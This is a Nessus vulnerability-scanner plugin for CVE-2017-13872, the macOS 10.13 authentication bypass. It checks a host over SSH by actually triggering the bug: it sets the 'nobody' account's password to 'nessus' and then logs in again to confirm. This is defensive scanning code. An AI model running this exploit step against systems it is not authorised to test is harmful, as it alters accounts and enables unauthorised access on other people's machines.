#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(105003);
  script_version("1.9");
  script_cvs_date("Date: 2019/11/12");

  script_cve_id("CVE-2017-13872");
  script_bugtraq_id(101981);

  script_name(english:"macOS 10.13 Authentication Bypass Remote Check (CVE-2017-13872)");
  script_summary(english:"Attempts to set the 'nobody' account password via SSH.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is affected by an authentication bypass vulnerability.
A local attacker or a remote attacker with credentials for a standard
user account has the ability to blank out the root account password.
This can allow an authenticated attacker to escalate privileges to
root and execute commands and read files as a system administrator.
A remote attacker without credentials can set passwords on certain
disabled accounts.

Note that if this plugin is successful, Nessus has set the password on
the 'nobody' account to 'nessus', and you will need to reset this
password/re-disable this account to clean up.");
  script_set_attribute(attribute:"see_also", value:"https://support.apple.com/en-us/HT208315");
  # https://objective-see.com/blog/blog_0x24.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2cf4b55a");
  # https://twitter.com/lemiorhan/status/935578694541770752
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9ff9ff45");
  # https://www.theregister.co.uk/2017/11/28/root_access_bypass_macos_high_sierra/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1e5890f3");
  # https://www.theverge.com/2017/11/28/16711782/apple-macos-high-sierra-critical-password-security-flaw
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f367aab4");
  # https://support.apple.com/en-us/HT204012
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f9f9bbc3");
  script_set_attribute(attribute:"solution", value:
"Apply Apple Security Update 2017-001.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-13872");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Mac OS X Root Privilege Escalation');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/11/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/11/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/12/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:mac_os_x");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:macos");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2017-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_detect.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

include("ssh_lib.inc");

port = get_service(svc:"ssh", default:22, exit_on_fail:TRUE);

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

user = "nobody";
pass = "nessus";

# if vuln and not yet 'exploited', this will set the password
# but it returns USERAUTH_FAILURE and closes the socket
session = new("sshlib::session");
session.open_connection(port:port);
ret = session.login(method:"password", extra:make_array("username", user, "password", pass));
# if we get anything other than USERAUTH_FAILURE here it is not vulnerable
if (session.cur_state.val != "USERAUTH_FAILURE")
{
  session.close_connection();
  audit(AUDIT_HOST_NOT, "affected");
}
session.close_connection();

# if vuln and 'exploited' by nessus (password has been set to nessus),
# this will succeed, but return SOC_CLOSED
session = new("sshlib::session");
session.open_connection(port:port);
ret = session.login(method:"password", extra:make_array("username", user, "password", pass));

# if the password is wrong our state will be USERAUTH_FAILURE and our error will be different
# below is the response if authentication succeded but then the ssh connection was closed
# due to /usr/bin/false being the login shell
if (session.cur_state.val == "SOC_CLOSED" &&
    'Socket error: Connection reset by peer\nFailed to authenticate using the supplied password.\n' >< session.error)
{
  # vuln
  report = '  Nessus was able to log in as "' + user + '" on the remote host\n' +
           '  by first setting the account password to "' + pass + '" by\n' +
           '  simply attempting to log in, and then verifying it was\n' +
           '  set by attempting to log in again. While this does not\n' +
           '  allow any type of command execution due to the nobody\n' +
           '  account using /usr/bin/false as a shell, this means the\n' +
           '  remote host is vulnerable to CVE-2017-13872, an\n' +
           '  authentication bypass vulnerability in macOS 10.13.\n' +
           '\n' +
           '  Note that if this plugin is successful, Nessus has set the\n' +
           '  password on the "nobody" account to "nessus", and you will\n' +
           '  need to reset this password/re-disable this account to clean\n' +
           '   up.\n' +
           '\n';
  security_report_v4(
    port       : session.port,
    severity   : SECURITY_HOLE,
    extra      : report
  );
}
else
{
  session.close_connection();
  audit(AUDIT_HOST_NOT, "affected");
}
session.close_connection();
